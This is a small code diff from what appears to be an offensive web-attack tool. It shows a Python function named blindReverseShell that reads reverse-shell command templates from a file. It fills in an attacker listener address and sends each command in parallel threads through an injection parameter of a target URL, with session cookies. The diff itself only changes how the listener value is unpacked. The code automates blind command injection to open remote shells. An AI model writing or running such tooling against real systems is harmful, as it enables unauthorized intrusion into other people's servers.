@@ -6,7 +6,7 @@ def blindReverseShell(url, injection_parameter, cookies, listenner):
   commands_file = open("flaskr/scripts/reverse_shell.txt", "r").readlines()
 
   for command in commands_file:
-    threading.Thread(target=request, args=(url, injection_parameter, cookies, command.format(listenner))).start()
+    threading.Thread(target=request, args=(url, injection_parameter, cookies, command.format(*listenner))).start()
 
 def request(url, injection_parameter, cookies, command):
   postParams = {
